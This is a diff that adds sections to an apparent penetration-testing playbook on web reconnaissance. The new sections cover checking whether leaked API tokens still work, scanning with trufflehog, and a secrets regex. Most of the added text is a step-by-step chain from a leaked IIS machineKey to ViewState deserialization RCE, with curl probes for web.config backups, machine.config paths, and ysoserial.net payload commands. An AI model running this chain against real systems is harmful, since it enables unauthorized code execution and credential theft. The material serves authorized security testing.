@@ -8,7 +8,7 @@ author: cyberstrike-official
 tags: [recon, fingerprint, enumeration, wstg, info]
 tech_stack: []
 cwe_ids: [CWE-200]
-chains_with: []
+chains_with: [wstg-info-01, wstg-info-02]
 prerequisites: []
 severity_boost: {}
 ---
@@ -426,6 +426,79 @@ python3 linkfinder.py -i https://target.com/app.js -o cli
 python3 linkfinder.py -i https://target.com -d -o results.html
 ```
 
+### API Key and Token Leak Validation (from PayloadsAllTheThings)
+
+Beyond just finding secrets, verify whether a discovered key/token is actually live before reporting it as a finding:
+
+```bash
+# Validate a Telegram Bot API token found in JS/comments
+curl https://api.telegram.org/bot<TOKEN>/getMe
+
+# Use KeyHacks to find the quick validation method for a given key type
+# https://github.com/streaak/keyhacks
+
+# Scan a discovered GitHub org/repo for verified secrets with trufflehog
+docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --org={target}
+docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo https://github.com/{target}/repo --issue-comments --pr-comments
+
+# Scan a Docker image hosted by the target for hardcoded secrets
+docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest docker --image {target}/image
+```
+
+Match candidate strings against a large signature database instead of hand-rolled regex to reduce false negatives:
+
+```yaml
+# mazen160/secrets-patterns-db style pattern entry
+patterns:
+  - pattern:
+      name: AWS API Key
+      regex: AKIA[0-9A-Z]{16}
+      confidence: high
+```
+
+Common leak sources to prioritize when triaging: hardcoded strings in source, `.env`/`config.json`/`.aws/credentials` left web-accessible, Docker image layers, and CI/CD build logs.
+
+### IIS Machine Key Leak → ViewState Deserialization RCE (from PayloadsAllTheThings)
+
+An exposed `validationKey`/`decryptionKey` (leaked via a `web.config`/`machine.config` backup file, a verbose ASPX error/stack trace, or a misconfigured source disclosure) lets an attacker forge a malicious `__VIEWSTATE` and achieve RCE on ASP.NET applications:
+
+```bash
+# 1. Look for a leaked machineKey in exposed config/backup files or verbose error pages
+curl -s "https://{target}/web.config"
+curl -s "https://{target}/web.config.bak"
+curl -s "https://{target}/api/test?id='" | grep -iE 'validationKey|decryptionKey|machineKey'
+# Common on-disk locations if LFI/file-read is available:
+#   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config
+#   C:\Windows\Microsoft.NET\Framework\v2.0.50727\config\machine.config
+
+# 2. Grab __VIEWSTATE / __VIEWSTATEGENERATOR from any ASPX page response
+curl -s "https://{target}/default.aspx" | grep -oE '__VIEWSTATE[A-Z]*" value="[^"]*"'
+
+# 3. If no key was leaked directly, try matching a KNOWN/public machineKey against the
+#    captured ViewState — many products ship with a static default key
+python3 examples/blacklist3r.py --viewstate "<__VIEWSTATE value>" --generator "<__VIEWSTATEGENERATOR value>"
+# or: ./viewstalker --viewstate "<__VIEWSTATE value>" -m <__VIEWSTATEGENERATOR> -M ./MachineKeys2.txt
+
+# 4. Generate a malicious ViewState with ysoserial.net using the recovered/leaked key
+#    (MAC enabled, encryption disabled example)
+ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" \
+  --generator=<__VIEWSTATEGENERATOR> --validationalg="SHA1" \
+  --validationkey="<LEAKED_VALIDATION_KEY>"
+
+# MAC + encryption both enabled (default HMACSHA256 / AES on .NET > 4.5):
+ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" \
+  --path="/somepath/default.aspx" --apppath="/" \
+  --decryptionalg="AES" --decryptionkey="<LEAKED_DECRYPTION_KEY>" \
+  --validationalg="HMACSHA256" --validationkey="<LEAKED_VALIDATION_KEY>"
+
+# 5. Submit the generated payload as __VIEWSTATE to the vulnerable ASPX page
+curl -s -X POST "https://{target}/default.aspx" \
+  --data-urlencode "__VIEWSTATE=<GENERATED_PAYLOAD>" \
+  --data-urlencode "__VIEWSTATEGENERATOR=<__VIEWSTATEGENERATOR>"
+```
+
+Treat any exposed `validationKey`/`decryptionKey` as a Critical finding even without immediate ViewState access — the same key also forges Forms Authentication cookies, and if shared across a web farm it compromises every application using it.
+
 ### Regex Patterns for Secret Detection
 
 ```bash
@@ -642,6 +715,7 @@ module.exports = {
 
 - [KeyHacks](https://github.com/streaak/keyhacks)
 - [OWASP Source Code Analysis Tools](https://owasp.org/www-community/Source_Code_Analysis_Tools)
+- [PayloadsAllTheThings - API Key Leaks](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API%20Key%20Leaks)
 
 
 ---
